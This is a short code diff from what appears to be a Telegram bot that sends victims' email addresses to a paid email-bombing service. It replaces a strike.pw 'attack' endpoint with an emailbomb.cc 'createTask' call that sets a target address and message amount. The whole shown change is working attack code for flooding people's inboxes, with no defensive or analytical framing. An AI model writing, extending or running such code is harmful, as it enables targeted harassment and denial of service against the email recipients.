@@ -168,7 +168,7 @@ bot.onText(/.*/, async (msg) => {
                         }
 
                         try {
-                            const url = `https://strike.pw/api/v1/public/attack?key=${process.env.STRIKE_API_KEY}&target=${encodeURIComponent(row.email)}&mode=normal&amount=${emailAmount}`;
+                            const url = `https://emailbomb.cc/api?apikey=${process.env.STRIKE_API_KEY}&action=createTask&email=${encodeURIComponent(row.email)}&amount=${emailAmount}`;
                             const response = await axios.get(url);
 
                             console.log("API response:", response.data);
